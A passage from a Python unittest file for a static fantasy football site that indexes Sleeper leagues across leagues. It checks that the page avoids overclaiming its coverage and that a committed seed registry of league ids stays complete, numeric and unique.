                          "all of Sleeper's", "complete index of Sleeper"):
            self.assertNotIn(overclaim, html)

    def test_the_banner_reports_the_queue(self):
        from dynasty.crossleague_js import CROSSLEAGUE_JS
        self.assertIn("xlQueueSentence", CROSSLEAGUE_JS)
        self.assertIn("n_never_scored", CROSSLEAGUE_JS)

    def test_the_page_states_what_a_static_site_cannot_do(self):
        from dynasty import crossleague_page
        html = crossleague_page._methodology_html()
        self.assertIn("no server", html.lower())
        self.assertIn("cannot", html.lower())


class TestSeedRegistryIsTheDurableFloor(unittest.TestCase):
    """The committed registry, as it actually exists in this checkout."""

    def setUp(self):
        p = REPO_ROOT / "data" / "cross_league" / "seeds.json"
        if not p.exists():
            self.skipTest("no seed registry in this checkout")
        self.reg = json.loads(p.read_text(encoding="utf-8"))

    def test_the_original_seed_is_still_present(self):
        ids = {str(s.get("league_id")) for s in self.reg["seeds"]}
        self.assertIn("1316222126914539520", ids,
                      "the founding seed must never be dropped")

    def test_every_league_the_first_build_indexed_is_seeded(self):
        """Coverage must not regress when crawl state is lost."""
        corpus_path = REPO_ROOT / "data" / "cross_league" / "corpus.json"
        if not corpus_path.exists():
            self.skipTest("no committed corpus")
        corpus = json.loads(corpus_path.read_text(encoding="utf-8"))
        seeded = {str(s.get("league_id")) for s in self.reg["seeds"]}
        for L in corpus.get("leagues") or []:
            self.assertIn(str(L["league_id"]), seeded,
                          f"{L.get('name')} is indexed but not seeded, so a "
                          f"lost crawl state would lose it")

    def test_every_seed_id_is_digits(self):
        for s in self.reg["seeds"]:
            self.assertRegex(str(s["league_id"]), r"^[0-9]{6,24}$")

    def test_seed_ids_are_unique(self):
        ids = [str(s["league_id"]) for s in self.reg["seeds"]]
        self.assertEqual(len(ids), len(set(ids)))


if __name__ == "__main__":
    unittest.main(verbosity=2)
